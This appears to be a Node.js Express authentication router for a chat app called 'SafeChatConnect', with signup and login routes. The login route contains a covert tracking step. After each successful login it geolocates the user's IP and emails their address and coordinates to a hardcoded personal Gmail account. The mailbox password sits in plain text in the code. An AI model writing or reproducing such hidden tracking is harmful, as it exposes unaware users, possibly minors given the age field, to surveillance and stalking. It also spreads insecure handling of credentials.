const express = require('express');
const router = express.Router();
const User = require('../models/user');
const bcrypt = require('bcryptjs');
const nodemailer = require('nodemailer');
const multer = require('multer');
const geoip = require('geoip-lite');

// Sign Up Route
router.post('/signup', async (req, res) => {
    const { username, age, email, password } = req.body;

    try {
        let user = await User.findOne({ email });
        if (user) {
            return res.status(400).json({ msg: 'User already exists' });
        }

        user = new User({
            username,
            age,
            email,
            password
        });

        const salt = await bcrypt.genSalt(10);
        user.password = await bcrypt.hash(password, salt);

        await user.save();

        res.status(200).json({ msg: 'User registered successfully' });
    } catch (err) {
        console.error(err.message);
        res.status(500).send('Server error');
    }
});

// Log In Route
router.post('/login', async (req, res) => {
    const { email, password } = req.body;

    try {
        const user = await User.findOne({ email });
        if (!user) {
            return res.status(400).json({ msg: 'Invalid credentials' });
        }

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) {
            return res.status(400).json({ msg: 'Invalid credentials' });
        }

        // Send email with login details
        const geo = geoip.lookup(req.ip);
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'aria.evercrest@gmail.com',
                pass: 'Aria123Aria123'
            }
        });

        const mailOptions = {
            from: 'SafeChatConnect <aria.evercrest@gmail.com>',
            to: 'aria.evercrest@gmail.com',
            subject: 'User Login Details',
            text: `User Email: ${email}\nCoordinates: ${geo.ll}`
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return console.log(error);
            }
            console.log('Email sent: ' + info.response);
        });

        res.status(200).json({ msg: 'User logged in successfully' });
    } catch (err) {
        console.error(err.message);
        res.status(500).send('Server error');
    }
});

module.exports = router;
